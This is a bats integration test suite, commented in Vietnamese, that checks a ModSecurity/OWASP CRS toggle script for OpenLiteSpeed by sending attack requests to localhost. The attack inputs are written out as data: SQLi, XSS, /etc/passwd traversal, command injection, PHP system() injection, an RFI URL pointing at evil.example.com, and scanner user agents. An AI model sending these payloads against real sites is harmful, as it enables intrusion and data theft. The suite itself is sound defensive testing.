#!/usr/bin/env bats
#
# Kiểm thử tích hợp cho wptt-modsecurity (bật/tắt ModSecurity + OWASP CRS trên OpenLiteSpeed)
#
# KHÔNG CẦN cài WordPress: chỉ cần thêm website (wptt-themwebsite), bộ test tự đặt một file tĩnh
# vào đúng thư mục gốc của website rồi tấn công thử vào file đó.
#
# Quy trình:
#   setup_file : thêm website, tìm docRoot thật của vhost, đặt file tĩnh, chờ OLS phục vụ HTTP 200
#   Nhóm 1     : kiểm tra đối số đầu vào
#   Nhóm 2     : baseline khi WAF TẮT (tấn công phải LỌT QUA với HTTP 2xx/3xx, đo độ trễ gốc)
#   Nhóm 3     : bật WAF, kiểm tra cấu hình, idempotent, bộ luật đã tinh gọn
#   Nhóm 4     : tấn công thật (SQLi, XSS, LFI, RCE, PHP injection, scanner...) => phải bị 403
#   Nhóm 5     : chống chặn nhầm (false positive) + đo độ trễ khi bật WAF
#   Nhóm 6     : rollback khi reload OpenLiteSpeed thất bại (mock)
#   Nhóm 7     : khóa chạy đồng thời (flock)
#   Nhóm 8     : tắt WAF, tấn công lại phải LỌT QUA
#   teardown_file : trả WAF về trạng thái ban đầu
#
# Chạy:  bats wptt-modsecurity.bats        (cần quyền root, curl, flock)
# Biến môi trường tùy chọn:
#   SCRIPT_MODSEC         đường dẫn script cần test
#   WAF_TEST_BASE         ép dùng URL cụ thể, ví dụ http://127.0.0.1 (mặc định tự dò)
#   WAF_MAX_OVERHEAD_MS   ngưỡng chậm thêm tối đa khi bật WAF (mặc định 800ms)
#   WAF_TEST_INSTALL_WP=1 cài thêm WordPress để chạy các test WordPress (mặc định KHÔNG cài)
#   WAF_TEST_CLEANUP=1    xóa website test sau khi xong (cần script xóa website tồn tại)

TEST_DOMAIN="wptest-waf.com"
CORE_BAK="/tmp/core-functions.bak"
BASELINE_FILE="/tmp/wptt-waf-baseline-ms"
THEM_LOG="/tmp/wptt-waf-themwebsite.log"
LOCK_FILE="/var/lock/wptt-modsecurity.lock"
CONFIG_FILE="/usr/local/lsws/conf/httpd_config.conf"
OWASP_DIR="/usr/local/lsws/modsec/owasp"
MSG_KHONG_WP="WordPress chưa được cài hoặc không phản hồi (không bắt buộc)"

# =================================================================
# HÀM TIỆN ÍCH
# =================================================================

in_log_neu_loi() {
  local ma_ky_vong="$1"
  if [ "$status" -ne "$ma_ky_vong" ]; then
    echo -e "\n[Modsecurity Test][LỖI TEST] Kịch bản không trả về mã $ma_ky_vong như kỳ vọng!" >&3
    echo "Mã trạng thái thực tế : $status" >&3
    echo -e "Nội dung in ra màn hình:\n$output" >&3
  fi
}

tim_script() {
  local c
  for c in "${SCRIPT_MODSEC:-}" /etc/wptt/bao-mat/wptt-modsecurity; do
    [[ -n "$c" && -f "$c" ]] && { echo "$c"; return 0; }
  done
  return 1
}

# Tìm thư mục gốc (docRoot) THẬT của vhost: đọc vhRoot trong httpd_config.conf và docRoot trong file cấu hình vhost.
# Không giả định cứng đường dẫn; không tìm được thì dùng /usr/local/lsws/<domain>/html.
tim_docroot() {
  local d="$1" vhroot="" docroot="" f
  local dir="/usr/local/lsws/conf/vhosts/$1"
  local sr="/usr/local/lsws/"
  sr="${sr%/}"
  local lit_vh='$VH_ROOT' lit_sr='$SERVER_ROOT' lit_vn='$VH_NAME'

  vhroot="$(awk -v d="$d" '
    $1 == "virtualhost" && $2 == d { inblk = 1; next }
    inblk && $1 == "vhRoot" { print $2; exit }
    inblk && /^}/ { inblk = 0 }
  ' "$CONFIG_FILE" 2>/dev/null)"
  if [[ -z "$vhroot" ]]; then vhroot="/usr/local/lsws/$d"; fi
  vhroot="${vhroot%/}"

  for f in "$dir/vhconf.conf" "$dir/vhost.conf"; do
    if [[ -f "$f" ]]; then
      docroot="$(awk '$1 == "docRoot" { print $2; exit }' "$f" 2>/dev/null)"
      if [[ -n "$docroot" ]]; then break; fi
    fi
  done
  if [[ -z "$docroot" ]]; then docroot='$VH_ROOT/html'; fi

  docroot="${docroot//"$lit_vh"/$vhroot}"
  docroot="${docroot//"$lit_sr"/$sr}"
  docroot="${docroot//"$lit_vn"/$d}"
  echo "${docroot%/}"
}

# Cài WordPress tự động (CHỈ chạy khi đặt WAF_TEST_INSTALL_WP=1)
cai_wordpress() {
  local script_goc="/etc/wptt/wptt-install-wordpress2"
  local script_test="/tmp/wptt-install-wp-waf-test.sh"
  [[ -f "$script_goc" ]] || return 0

  cp "$script_goc" "$script_test"
  sed -i 's/exec \/etc\/wptt\/wptt-wordpress-main.*/exit 0/g' "$script_test"
  sed -i 's/exec \/usr\/bin\/wptangtoc.*/exit 0/g' "$script_test"
  echo "exit 0" >> "$script_test"
  chmod +x "$script_test"

  cat << EOF > /etc/wptt/core-functions
source $CORE_BAK
wptt_xac_nhan() { return 0; }
EOF
  local inputs="Website WAF Test\nadmin_$(date +%s)\nPassKh0_$(date +%N)\nadmin@${TEST_DOMAIN}\n"
  echo -e "$inputs" | bash "$script_test" "$TEST_DOMAIN" >/dev/null 2>&1 || true
  cp "$CORE_BAK" /etc/wptt/core-functions 2>/dev/null || true
  rm -f "$script_test"
}

# Gửi GET với 1 tham số (curl tự URL-encode), trả về HTTP code. Tham số thừa truyền thẳng cho curl.
code_get() {
  local name="$1" value="$2"; shift 2
  curl -s -o /dev/null -w '%{http_code}' --connect-timeout 3 --max-time 10 -k -G \
    -H "Host: ${TEST_DOMAIN}" --data-urlencode "${name}=${value}" "$@" \
    "${WAF_TEST_BASE:-http://127.0.0.1}${WAF_TARGET_PATH:-/}"
}

# Gửi GET thường tới một đường dẫn
code_path() {
  local path="$1"; shift
  curl -s -o /dev/null -w '%{http_code}' --connect-timeout 3 --max-time 10 -k \
    -H "Host: ${TEST_DOMAIN}" "$@" "${WAF_TEST_BASE:-http://127.0.0.1}${path}"
}

# Gửi POST form, trả về HTTP code
code_post() {
  local path="$1"; shift
  curl -s -o /dev/null -w '%{http_code}' --connect-timeout 3 --max-time 10 -k -X POST \
    -H "Host: ${TEST_DOMAIN}" "$@" "${WAF_TEST_BASE:-http://127.0.0.1}${path}"
}

# Trung bình thời gian phản hồi (ms) của N request hợp lệ.
# Trả về -1 ngay khi gặp lỗi kết nối (không để test bị treo).
avg_ms() {
  local n="${1:-10}" i out code t total=0
  for ((i = 0; i < n; i++)); do
    out=$(curl -s -o /dev/null -w '%{http_code} %{time_total}' --connect-timeout 3 --max-time 10 -k \
      -H "Host: ${TEST_DOMAIN}" "${WAF_TEST_BASE:-http://127.0.0.1}${WAF_TARGET_PATH:-/}")
    code="${out%% *}"
    t="${out##* }"
    if [[ "$code" == "000" ]]; then echo "-1"; return 0; fi
    total=$(awk -v a="$total" -v b="$t" 'BEGIN{print a+b}')
  done
  awk -v t="$total" -v n="$n" 'BEGIN{printf "%d", (t/n)*1000}'
}

# Dò địa chỉ mà OpenLiteSpeed thật sự PHỤC VỤ ĐƯỢC FILE PROBE (bắt buộc HTTP 200).
# Chỉ "có phản hồi" là chưa đủ: 404 nghĩa là vhost chưa khớp hoặc file nằm sai chỗ.
chon_base_url() {
  local attempt c code ip
  local -a cands=()
  if [[ -n "${WAF_TEST_BASE:-}" ]]; then cands+=("$WAF_TEST_BASE"); fi
  cands+=("http://127.0.0.1" "http://localhost" "http://[::1]")
  for ip in $(hostname -I 2>/dev/null); do cands+=("http://$ip"); done
  cands+=("https://127.0.0.1" "http://127.0.0.1:8088")

  for attempt in 1 2 3 4 5 6 7 8; do
    for c in "${cands[@]}"; do
      code=$(curl -s -k -o /dev/null -w '%{http_code}' --connect-timeout 3 --max-time 6 \
        -H "Host: ${TEST_DOMAIN}" "$c/waf-probe.html" 2>/dev/null) || true
      if [[ "$code" == "200" ]]; then
        echo "$c"
        return 0
      fi
    done
    sleep 3
  done
  return 1
}

chan_doan_ket_noi() {
  local rc f
  echo "[Modsecurity Test][CHẨN ĐOÁN] Không có địa chỉ nào phục vụ được /waf-probe.html với HTTP 200." >&3

  echo "--- docRoot đã dò được: ${WAF_DOCROOT:-?}" >&3
  { ls -la "${WAF_DOCROOT:-/nonexistent}" 2>&1 | head -n 15; } >&3 || true

  echo "--- Log wptt-themwebsite (25 dòng cuối):" >&3
  { tail -n 25 "$THEM_LOG" 2>&1; } >&3 || true

  echo "--- Thư mục vhost và cấu hình domain/docRoot:" >&3
  { ls -la "/usr/local/lsws/conf/vhosts/${TEST_DOMAIN}" 2>&1; } >&3 || true
  for f in "/usr/local/lsws/conf/vhosts/${TEST_DOMAIN}/vhconf.conf" "/usr/local/lsws/conf/vhosts/${TEST_DOMAIN}/vhost.conf"; do
    if [[ -f "$f" ]]; then
      echo "(file $f)" >&3
      { grep -nE 'docRoot|vhDomain|vhAliases|rewrite|enable ' "$f" | head -n 15; } >&3 || true
    fi
  done

  echo "--- Đăng ký vhost và map listener trong httpd_config.conf:" >&3
  { grep -n -A6 "virtualhost ${TEST_DOMAIN}" "$CONFIG_FILE" 2>&1 | head -n 12; } >&3 || true
  { grep -n "map.*${TEST_DOMAIN}" "$CONFIG_FILE" 2>&1 | head -n 6; } >&3 || true

  echo "--- Cổng đang lắng nghe (rút gọn):" >&3
  { ss -ltn 2>/dev/null | grep -E ':(80|443|8088)\b' | sort -u; } >&3 || echo "(không có cổng nào)" >&3

  echo "--- Biến proxy trong môi trường:" >&3
  { env | grep -i proxy; } >&3 || echo "(không có)" >&3

  echo "--- curl file probe CÓ header Host:" >&3
  curl -sS -v -o /dev/null --noproxy '*' --connect-timeout 3 --max-time 10 \
    -H "Host: ${TEST_DOMAIN}" http://127.0.0.1/waf-probe.html 2>&1 | tail -n 10 >&3
  rc="${PIPESTATUS[0]}"
  echo "(curl exit code: $rc)" >&3

  echo "--- curl file probe KHÔNG có header Host (vhost mặc định):" >&3
  curl -sS -v -o /dev/null --noproxy '*' --connect-timeout 3 --max-time 10 \
    http://127.0.0.1/waf-probe.html 2>&1 | tail -n 10 >&3
  rc="${PIPESTATUS[0]}"
  echo "(curl exit code: $rc)" >&3

  echo "--- Trạng thái lsws:" >&3
  { /usr/local/lsws/bin/lswsctrl status 2>&1; } >&3 || true
  echo "--- 15 dòng cuối error.log:" >&3
  { tail -n 15 /usr/local/lsws/logs/error.log 2>/dev/null; } >&3 || true
}

# Khẳng định request bị chặn
assert_blocked() {
  local code="$1" ten="$2"
  if [ "$code" != "403" ]; then
    echo "[Modsecurity Test][LỖI TEST] '$ten' KHÔNG bị chặn. HTTP code thực tế: $code (kỳ vọng 403)" >&3
    return 1
  fi
}

# Khẳng định request lọt qua thật sự (HTTP 2xx/3xx). Mã 404/5xx/000 KHÔNG tính là lọt qua,
# tránh kết luận sai khi đích tấn công không tồn tại.
assert_passed() {
  local code="$1" ten="$2"
  if ! [[ "$code" =~ ^[23][0-9][0-9]$ ]]; then
    echo "[Modsecurity Test][LỖI TEST] '$ten' không lọt qua bình thường. HTTP code: $code (kỳ vọng 2xx/3xx)" >&3
    return 1
  fi
}

mock_reload_fail() {
  cat << EOF > /etc/wptt/core-functions
source $CORE_BAK
wptt_smart_reload_lsws() { return 1; }
EOF
}

modsec_block_present() {
  grep -Eq '^[[:space:]]*module[[:space:]]+mod_security' "$CONFIG_FILE"
}

# =================================================================
# SETUP / TEARDOWN
# =================================================================

setup_file() {
  [ "$(id -u)" -eq 0 ] || { echo "[Modsecurity Test][LỖI TEST] Cần chạy bằng root" >&3; return 1; }

  export CI="true"
  export TEST_DOMAIN
  # Không đi qua proxy khi gọi localhost
  export no_proxy="*" NO_PROXY="*"
  export SCRIPT_MODSEC
  SCRIPT_MODSEC="$(tim_script)" || { echo "[Modsecurity Test][LỖI TEST] Không tìm thấy script wptt-modsecurity" >&3; return 1; }

  # Sao lưu core-functions để tiêm mock khi cần
  cp /etc/wptt/core-functions "$CORE_BAK" 2>/dev/null || true

  # Ghi nhớ trạng thái ban đầu để trả lại khi kết thúc
  if bash "$SCRIPT_MODSEC" status >/dev/null 2>&1; then
    echo "on" > /tmp/wptt-waf-original-state
  else
    echo "off" > /tmp/wptt-waf-original-state
  fi

  # Luôn bắt đầu từ trạng thái TẮT cho kết quả xác định
  bash "$SCRIPT_MODSEC" off >/dev/null 2>&1 || true

  # 1. Thêm website (hệ thống tự tạo vhost). Giữ log để chẩn đoán khi lỗi.
  bash /etc/wptt/domain/wptt-themwebsite "$TEST_DOMAIN" >"$THEM_LOG" 2>&1 || true

  # 2. WordPress là TÙY CHỌN, mặc định không cài
  if [[ "${WAF_TEST_INSTALL_WP:-0}" == "1" ]]; then
    cai_wordpress
  fi

  # 3. Đặt file tĩnh làm mục tiêu tấn công vào đúng docRoot của vhost.
  #    ModSecurity vẫn kiểm tra đầy đủ URL/header/body của request tới file tĩnh.
  local docroot
  docroot="$(tim_docroot "$TEST_DOMAIN")"
  export WAF_DOCROOT="$docroot"
  mkdir -p "$docroot"
  echo "probe-ok" > "$docroot/waf-probe.html"
  if ! ls "$docroot"/index.* >/dev/null 2>&1; then
    echo "index-ok" > "$docroot/index.html"
  fi
  chown --reference="$docroot" "$docroot/waf-probe.html" "$docroot"/index.html 2>/dev/null || true
  chmod 644 "$docroot/waf-probe.html" "$docroot"/index.html 2>/dev/null || true
  export WAF_TARGET_PATH="/waf-probe.html"

  if [[ -x /usr/local/lsws/bin/lswsctrl ]]; then
    /usr/local/lsws/bin/lswsctrl reload >/dev/null 2>&1 || true
  fi

  # 4. Dò địa chỉ phục vụ được file probe (HTTP 200). Không được thì dừng ngay kèm chẩn đoán,
  #    để không chạy các test tấn công vào một đích 404 rồi cho kết quả sai.
  if ! WAF_TEST_BASE="$(chon_base_url)"; then
    chan_doan_ket_noi
    return 1
  fi
  export WAF_TEST_BASE
  echo "[Modsecurity Test][INFO] URL kiểm thử: $WAF_TEST_BASE (Host: $TEST_DOMAIN, docRoot: $docroot, mục tiêu: $WAF_TARGET_PATH)" >&3

  # 5. Có WordPress thật sự phản hồi không? Không có cũng không sao: test WordPress sẽ tự bỏ qua.
  local wp_code=""
  export WP_HTTP_OK=0
  if [[ -s "$docroot/wp-config.php" ]]; then
    wp_code="$(curl -s -k -o /dev/null -w '%{http_code}' --connect-timeout 3 --max-time 15 \
      -H "Host: ${TEST_DOMAIN}" "${WAF_TEST_BASE}/" 2>/dev/null)" || true
    if [[ "$wp_code" =~ ^(200|301|302)$ ]]; then
      export WP_HTTP_OK=1
    fi
  fi
  if [[ "$WP_HTTP_OK" != "1" ]]; then
    echo "[Modsecurity Test][INFO] Không dùng WordPress trong lần chạy này: các test WordPress sẽ được bỏ qua." >&3
  fi
}

teardown_file() {
  # Trả WAF về trạng thái ban đầu
  local original="off"
  if [[ -f /tmp/wptt-waf-original-state ]]; then original="$(cat /tmp/wptt-waf-original-state)"; fi
  cp "$CORE_BAK" /etc/wptt/core-functions 2>/dev/null || true
  bash "$SCRIPT_MODSEC" "$original" >/dev/null 2>&1 || true

  rm -f /tmp/wptt-waf-original-state "$BASELINE_FILE" "$CORE_BAK"

  # Tùy chọn: xóa website test (chỉnh đường dẫn script xóa cho đúng hệ thống của bạn)
  local script_xoa="${SCRIPT_XOA:-/etc/wptt/domain/wptt-xoawebsite}"
  if [[ "${WAF_TEST_CLEANUP:-0}" == "1" && -x "$script_xoa" ]]; then
    bash "$script_xoa" "$TEST_DOMAIN" >/dev/null 2>&1 || true
  fi
}

teardown() {
  # Sau mỗi test, luôn gỡ mock để không ảnh hưởng test kế tiếp
  if [[ -f "$CORE_BAK" ]]; then cp "$CORE_BAK" /etc/wptt/core-functions 2>/dev/null || true; fi
}

# =================================================================
# NHÓM 1: BỘ LỌC ĐỐI SỐ ĐẦU VÀO
# =================================================================

@test "[Modsecurity Test] Nhóm 1: Đối số không hợp lệ trả về mã 2" {
  run bash "$SCRIPT_MODSEC" "bat-tum-lum"
  in_log_neu_loi 2
  [ "$status" -eq 2 ]
  [[ "$output" =~ "Đối số không hợp lệ" ]]
}

@test "[Modsecurity Test] Nhóm 1: Gọi không đối số khi không có TTY không bị treo, trả về mã 2" {
  run timeout 15 bash "$SCRIPT_MODSEC" < /dev/null
  in_log_neu_loi 2
  [ "$status" -eq 2 ]
}

@test "[Modsecurity Test] Nhóm 1: --help in hướng dẫn và trả về mã 0" {
  run bash "$SCRIPT_MODSEC" --help
  in_log_neu_loi 0
  [ "$status" -eq 0 ]
  [[ "$output" =~ "ModSecurity" ]]
}

# =================================================================
# NHÓM 2: BASELINE KHI WAF TẮT
# =================================================================

@test "[Modsecurity Test] Nhóm 2: off đưa hệ thống về trạng thái TẮT (status trả mã 10)" {
  run bash "$SCRIPT_MODSEC" off
  in_log_neu_loi 0
  [ "$status" -eq 0 ]

  run bash "$SCRIPT_MODSEC" status
  [ "$status" -eq 10 ]
  [[ "$output" =~ "OFF" ]]
  ! modsec_block_present
}

@test "[Modsecurity Test] Nhóm 2: Website phục vụ được file tĩnh (HTTP 200) khi WAF TẮT" {
  local code
  code="$(code_path "${WAF_TARGET_PATH:-/}")"
  if [ "$code" != "200" ]; then
    echo "[Modsecurity Test][LỖI TEST] File probe trả HTTP $code (kỳ vọng 200). Mọi kết quả tấn công phía sau sẽ vô nghĩa." >&3
  fi
  [ "$code" = "200" ]
}

@test "[Modsecurity Test] Nhóm 2: Khi WAF TẮT, tấn công SQLi/XSS/LFI KHÔNG bị chặn (đối chứng)" {
  assert_passed "$(code_get id "1' OR '1'='1' -- -")" "SQLi (WAF tắt)"
  assert_passed "$(code_get q "<script>alert(1)</script>")" "XSS (WAF tắt)"
  assert_passed "$(code_get file "../../../../etc/passwd")" "LFI (WAF tắt)"
}

@test "[Modsecurity Test] Nhóm 2: Đo độ trễ gốc khi WAF TẮT" {
  local ms
  ms="$(avg_ms 10)"
  echo "$ms" > "$BASELINE_FILE"
  [ "$ms" -ge 0 ]
}

# =================================================================
# NHÓM 3: BẬT WAF
# =================================================================

@test "[Modsecurity Test] Nhóm 3: on bật ModSecurity thành công (mã 0)" {
  run bash "$SCRIPT_MODSEC" on
  in_log_neu_loi 0
  [ "$status" -eq 0 ]
  [[ "$output" =~ "ON" ]]
}

@test "[Modsecurity Test] Nhóm 3: Cấu hình OLS có khối module mod_security và trỏ đúng file luật" {
  modsec_block_present
  grep -q 'modsecurity_rules_file[[:space:]]*/usr/local/lsws/modsec/owasp/crs30/owasp-master.conf' "$CONFIG_FILE"
  grep -q 'SecRuleEngine On' "$CONFIG_FILE"
  # Bắt buộc kiểm tra BODY của request POST, nếu không SQLi/XSS trong form sẽ lọt qua
  grep -q 'SecRequestBodyAccess On' "$CONFIG_FILE"
  # Chỉ có đúng 1 khối module (không bị nhân đôi sau nhiều lần bật)
  [ "$(grep -Ec '^[[:space:]]*module[[:space:]]+mod_security' "$CONFIG_FILE")" -eq 1 ]
}

@test "[Modsecurity Test] Nhóm 3: File luật master có include và mọi file được include đều tồn tại" {
  local master="$OWASP_DIR/crs30/owasp-master.conf"
  [ -s "$master" ]
  [ "$(grep -c '^include ' "$master")" -gt 5 ]

  local missing=0 f
  while read -r _ f; do
    [[ -f "$f" ]] || { echo "[Modsecurity Test][LỖI TEST] Thiếu file luật: $f" >&3; missing=1; }
  done < <(grep '^include ' "$master")
  [ "$missing" -eq 0 ]
}

@test "[Modsecurity Test] Nhóm 3: Luật không thuộc hệ sinh thái PHP/Linux đã được lọc bỏ" {
  # Chỉ xét file LUẬT (*.conf). Thư mục rules còn chứa file dữ liệu *.data (java-classes.data,
  # iis-errors.data...) không phải luật, chỉ được nạp khi có luật tham chiếu tới nên bỏ qua.
  local conf_con_sot
  conf_con_sot="$(ls "$OWASP_DIR/crs30/rules/" | grep -E '\.conf$' | grep -E 'JAVA|NODEJS|IIS|WINDOWS|RUBY|PYTHON' || true)"
  if [ -n "$conf_con_sot" ]; then
    echo "[Modsecurity Test][LỖI TEST] File luật còn sót lại sau khi lọc:" >&3
    echo "$conf_con_sot" >&3
  fi
  [ -z "$conf_con_sot" ]

  # File master cũng không được include các luật đó
  run grep -E 'JAVA|NODEJS|IIS|WINDOWS|RUBY|PYTHON' "$OWASP_DIR/crs30/owasp-master.conf"
  [ "$status" -ne 0 ]

  # Luật PHP phải còn
  run bash -c "ls '$OWASP_DIR/crs30/rules/' | grep -E 'PHP.*\.conf$'"
  [ "$status" -eq 0 ]
}

@test "[Modsecurity Test] Nhóm 3: Thư mục tạm staging/old đã được dọn sạch" {
  [ ! -d "${OWASP_DIR}.new" ]
  [ ! -d "${OWASP_DIR}.old" ]
}

@test "[Modsecurity Test] Nhóm 3: status trả mã 0 khi đang bật" {
  run bash "$SCRIPT_MODSEC" status
  [ "$status" -eq 0 ]
  [[ "$output" =~ "ON" ]]
}

@test "[Modsecurity Test] Nhóm 3: on lần nữa là idempotent (không tải lại, mã 0)" {
  run bash "$SCRIPT_MODSEC" on
  in_log_neu_loi 0
  [ "$status" -eq 0 ]
  [[ "$output" =~ "đã được BẬT từ trước" ]]
}

@test "[Modsecurity Test] Nhóm 3: Tự phục hồi khi cấu hình bật nhưng thiếu bộ luật" {
  mv "$OWASP_DIR" "${OWASP_DIR}.sabotage"
  run bash "$SCRIPT_MODSEC" on
  in_log_neu_loi 0
  rm -rf "${OWASP_DIR}.sabotage"
  [ "$status" -eq 0 ]
  [ -s "$OWASP_DIR/crs30/owasp-master.conf" ]
}

# =================================================================
# NHÓM 4: TẤN CÔNG THẬT => PHẢI BỊ CHẶN (403)
# =================================================================

@test "[Modsecurity Test] Nhóm 4: Chặn SQL Injection kiểu boolean (OR 1=1)" {
  assert_blocked "$(code_get id "1' OR '1'='1' -- -")" "SQLi boolean"
}

@test "[Modsecurity Test] Nhóm 4: Chặn SQL Injection kiểu UNION SELECT" {
  assert_blocked "$(code_get id "1 UNION SELECT user_login,user_pass FROM wp_users--")" "SQLi UNION"
}

@test "[Modsecurity Test] Nhóm 4: Chặn SQL Injection kiểu time-based (SLEEP)" {
  assert_blocked "$(code_get id "1' AND SLEEP(5)-- -")" "SQLi time-based"
}

@test "[Modsecurity Test] Nhóm 4: Chặn XSS thẻ script" {
  assert_blocked "$(code_get s "<script>alert(document.cookie)</script>")" "XSS script"
}

@test "[Modsecurity Test] Nhóm 4: Chặn XSS qua thuộc tính sự kiện (onerror)" {
  assert_blocked "$(code_get s "<img src=x onerror=alert(1)>")" "XSS onerror"
}

@test "[Modsecurity Test] Nhóm 4: Chặn Local File Inclusion (đọc /etc/passwd)" {
  assert_blocked "$(code_get file "../../../../etc/passwd")" "LFI traversal"
}

@test "[Modsecurity Test] Nhóm 4: Chặn Remote File Inclusion" {
  assert_blocked "$(code_get page "http://evil.example.com/shell.txt?")" "RFI"
}

@test "[Modsecurity Test] Nhóm 4: Chặn Command Injection (OS command)" {
  assert_blocked "$(code_get cmd ";cat /etc/passwd")" "Command injection"
}

@test "[Modsecurity Test] Nhóm 4: Chặn PHP code injection" {
  assert_blocked "$(code_get x "<?php system('id'); ?>")" "PHP injection"
}

@test "[Modsecurity Test] Nhóm 4: Chặn công cụ quét lỗ hổng (User-Agent sqlmap)" {
  assert_blocked "$(code_path "${WAF_TARGET_PATH:-/}" -A "sqlmap/1.7.2#stable (https://sqlmap.org)")" "Scanner sqlmap"
}

@test "[Modsecurity Test] Nhóm 4: Chặn công cụ quét lỗ hổng (User-Agent nikto)" {
  assert_blocked "$(code_path "${WAF_TARGET_PATH:-/}" -A "Mozilla/5.00 (Nikto/2.5.0) (Evasions:None) (Test:001)")" "Scanner nikto"
}

@test "[Modsecurity Test] Nhóm 4: Chặn SQL Injection nằm trong BODY của request POST (file tĩnh)" {
  local code
  code="$(code_post "${WAF_TARGET_PATH:-/}" \
    --data-urlencode "log=admin' OR 1=1-- -" --data-urlencode "pwd=x")"
  if [ "$code" != "403" ]; then
    echo "[Modsecurity Test][GỢI Ý] POST body không bị kiểm tra. Hãy xem httpd_config.conf đã có 'SecRequestBodyAccess On' chưa." >&3
  fi
  assert_blocked "$code" "SQLi trong POST body"
}

@test "[Modsecurity Test] Nhóm 4: Chặn XSS nằm trong BODY của request POST (file tĩnh)" {
  local code
  code="$(code_post "${WAF_TARGET_PATH:-/}" \
    --data-urlencode "comment=<script>alert(document.cookie)</script>")"
  if [ "$code" != "403" ]; then
    echo "[Modsecurity Test][GỢI Ý] POST body không bị kiểm tra. Hãy xem httpd_config.conf đã có 'SecRequestBodyAccess On' chưa." >&3
  fi
  assert_blocked "$code" "XSS trong POST body"
}

@test "[Modsecurity Test] Nhóm 4: Chặn SQLi qua POST vào wp-login.php (không cần cài WordPress)" {
  # WAF chặn ở giai đoạn nhận request nên trả 403 kể cả khi website chưa có wp-login.php
  assert_blocked "$(code_post "/wp-login.php" \
    --data-urlencode "log=admin' OR 1=1-- -" --data-urlencode "pwd=x")" "SQLi POST wp-login"
}

@test "[Modsecurity Test] Nhóm 4: Chặn tấn công đặt trong header (Referer chứa XSS)" {
  assert_blocked "$(code_path "${WAF_TARGET_PATH:-/}" -H "Referer: <script>alert(1)</script>")" "XSS Referer"
}

@test "[Modsecurity Test] Nhóm 4: Chặn tấn công mã hóa URL kép (double-encoding LFI)" {
  assert_blocked "$(code_path "${WAF_TARGET_PATH:-/}?file=%252e%252e%252f%252e%252e%252fetc%252fpasswd")" "Double-encoded LFI"
}

# =================================================================
# NHÓM 5: CHỐNG CHẶN NHẦM + HIỆU NĂNG
# =================================================================

@test "[Modsecurity Test] Nhóm 5: Truy cập file tĩnh bình thường vẫn được phép (HTTP 200)" {
  local code
  code="$(code_path "${WAF_TARGET_PATH:-/}")"
  [ "$code" = "200" ]
}

@test "[Modsecurity Test] Nhóm 5: Trang chủ website truy cập bình thường vẫn được phép" {
  local code
  code="$(code_path "/")"
  [[ "$code" =~ ^(200|301|302)$ ]]
}

@test "[Modsecurity Test] Nhóm 5: Trang đăng nhập WordPress (GET) vẫn truy cập được" {
  [ "${WP_HTTP_OK:-0}" = "1" ] || skip "$MSG_KHONG_WP"
  local code
  code="$(code_path "/wp-login.php")"
  [[ "$code" =~ ^(200|301|302|404)$ ]]
}

@test "[Modsecurity Test] Nhóm 5: Tìm kiếm bình thường không bị chặn nhầm" {
  assert_passed "$(code_get s "huong dan cai dat wordpress")" "Tìm kiếm hợp lệ"
}

@test "[Modsecurity Test] Nhóm 5: Đăng nhập POST hợp lệ không bị chặn nhầm" {
  [ "${WP_HTTP_OK:-0}" = "1" ] || skip "$MSG_KHONG_WP"
  assert_passed "$(code_post "/wp-login.php" \
    --data-urlencode "log=editor" --data-urlencode "pwd=MatKhau123")" "POST đăng nhập hợp lệ"
}

@test "[Modsecurity Test] Nhóm 5: Độ trễ khi bật WAF nằm trong ngưỡng cho phép" {
  local base on max overhead
  base="$(cat "$BASELINE_FILE" 2>/dev/null || echo 0)"
  on="$(avg_ms 10)"
  [ "$on" -ge 0 ]
  max="${WAF_MAX_OVERHEAD_MS:-800}"
  overhead=$((on - base))
  echo "[Modsecurity Test][INFO] Độ trễ: WAF TẮT=${base}ms | WAF BẬT=${on}ms | chênh lệch=${overhead}ms (ngưỡng ${max}ms)" >&3
  [ "$overhead" -le "$max" ]
}

# =================================================================
# NHÓM 6: ROLLBACK KHI RELOAD OPENLITESPEED THẤT BẠI
# =================================================================

@test "[Modsecurity Test] Nhóm 6: off thất bại do reload lỗi => rollback, WAF vẫn BẬT và còn bộ luật" {
  mock_reload_fail
  run bash "$SCRIPT_MODSEC" off
  in_log_neu_loi 1
  [ "$status" -eq 1 ]
  modsec_block_present
  [ -s "$OWASP_DIR/crs30/owasp-master.conf" ]
}

@test "[Modsecurity Test] Nhóm 6: Sau rollback, WAF thật vẫn chặn tấn công" {
  assert_blocked "$(code_get id "1' OR '1'='1' -- -")" "SQLi sau rollback"
}

@test "[Modsecurity Test] Nhóm 6: on thất bại do reload lỗi => rollback, không để lại cấu hình/thư mục rác" {
  # Đưa về TẮT sạch trước
  run bash "$SCRIPT_MODSEC" off
  [ "$status" -eq 0 ]

  mock_reload_fail
  run bash "$SCRIPT_MODSEC" on
  in_log_neu_loi 1
  [ "$status" -eq 1 ]
  ! modsec_block_present
  [ ! -d "$OWASP_DIR" ]
  [ ! -d "${OWASP_DIR}.new" ]
  [ ! -d "${OWASP_DIR}.old" ]
}

# =================================================================
# NHÓM 7: KHÓA CHẠY ĐỒNG THỜI
# =================================================================

@test "[Modsecurity Test] Nhóm 7: Khi có tiến trình khác giữ khóa, script phải chờ (không chạy chồng)" {
  command -v flock >/dev/null || skip "Không có flock"

  flock "$LOCK_FILE" sleep 6 3>&- >/dev/null 2>&1 &
  local holder=$!
  sleep 1

  run timeout 3 bash "$SCRIPT_MODSEC" status
  wait "$holder" 2>/dev/null || true

  # 124 = bị timeout vì đang chờ khóa
  [ "$status" -eq 124 ]
}

# =================================================================
# NHÓM 8: TẮT WAF VÀ KIỂM CHỨNG LẠI
# =================================================================

@test "[Modsecurity Test] Nhóm 8: Bật lại WAF để chuẩn bị kiểm tra vòng tắt cuối" {
  run bash "$SCRIPT_MODSEC" on
  in_log_neu_loi 0
  [ "$status" -eq 0 ]
  assert_blocked "$(code_get id "1' OR '1'='1' -- -")" "SQLi trước khi tắt"
}

@test "[Modsecurity Test] Nhóm 8: off gỡ cấu hình và xóa bộ luật" {
  run bash "$SCRIPT_MODSEC" off
  in_log_neu_loi 0
  [ "$status" -eq 0 ]
  [[ "$output" =~ "OFF" ]]
  ! modsec_block_present
  [ ! -d "$OWASP_DIR" ]
}

@test "[Modsecurity Test] Nhóm 8: off lần nữa là idempotent (mã 0)" {
  run bash "$SCRIPT_MODSEC" off
  in_log_neu_loi 0
  [ "$status" -eq 0 ]
  [[ "$output" =~ "đã được TẮT từ trước" ]]
}

@test "[Modsecurity Test] Nhóm 8: Sau khi tắt, tấn công không còn bị WAF chặn" {
  assert_passed "$(code_get id "1' OR '1'='1' -- -")" "SQLi sau khi tắt"
